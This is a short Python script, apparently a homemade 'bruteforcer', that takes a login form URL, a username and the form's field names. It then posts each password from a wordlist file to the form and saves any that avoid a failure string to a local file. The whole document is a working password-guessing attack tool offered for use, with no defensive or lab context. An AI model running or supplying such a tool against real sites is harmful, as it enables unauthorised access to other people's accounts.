import requests
print ("WELCOME TO THE BRUTEFORCER")
print ("SELECT THE NEXT OPTIONS: ")
print ()
link = input ("Posting url >>>   ")
print ()
user = input ("User >>>   ")
print ()
userp = input ("User Parameter >>>   ")
print ()
passp = input ("Password Parameter >>>   ")
print ()
neg = input ("Negative Paramater >>>   ")
print ()
dictionary = open('passwords.txt','r').readlines()
for line in dictionary:
	password = line.strip()
	http = requests.post(link, data={passp:password, userp:user})
	content = http.content
	if neg in str(content):
		print ("PASS NOT FOUND > "+(password))
	else:
		passfound = ("PASSWORD "+(password)+" Found from IP > "+str(link)+" And user > "+str(user))
		file = open("news.txt", "a")
		file.write(passfound)
